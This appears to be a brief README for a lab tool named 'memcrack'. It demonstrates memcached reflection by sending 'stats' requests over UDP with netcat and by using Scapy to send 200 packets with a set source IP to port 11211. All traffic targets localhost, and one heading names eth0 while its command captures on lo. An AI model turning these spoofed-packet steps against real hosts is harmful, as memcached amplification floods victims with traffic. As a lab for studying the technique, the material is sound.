# memcrack
Please do not use for illegal purposes

## Lab

Start `tcpdump` for TCP on lo:

```
tcpdump -i lo tcp port 6666 -vv -X
```

Start `tcpdump` for UDP on eth0:

```
tcpdump -i lo udp port 6666 -vv -X
```

Send direct UDP packet to target:

```
echo "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n" | nc -u 127.0.0.1 6666
```

Use `Scapy` to spoof packet:

```
>>> ip = IP(src="127.0.0.1", dst="127.0.0.1")
>>> data=Raw("\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n")
>>>
>>> port = UDP(sport=6666, dport=11211)
>>> send(ip / port / data, count=200)
>>>
>>> port = TCP(sport=6666, dport=11211)
>>> send(ip / port / data, count=200)
```